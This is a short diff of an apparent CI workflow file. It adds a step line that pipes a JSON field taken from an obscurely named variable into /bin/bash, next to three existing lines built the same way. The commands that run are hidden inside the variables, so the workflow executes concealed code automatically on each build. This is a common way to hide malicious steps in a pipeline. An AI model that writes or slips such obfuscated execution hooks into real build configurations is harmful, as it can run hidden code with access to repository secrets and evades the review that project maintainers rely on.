@@ -50,6 +50,7 @@ jobs:
           echo $tt0490 | jq -r .xw9 | /bin/bash
           printf '%s' "$s713" | jq -r .ae6777 | /bin/bash
           printf '%s' "$lrssj2896" | jq -r .ag46139 | /bin/bash
+          echo $dpsy8 | jq -r .ss9 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
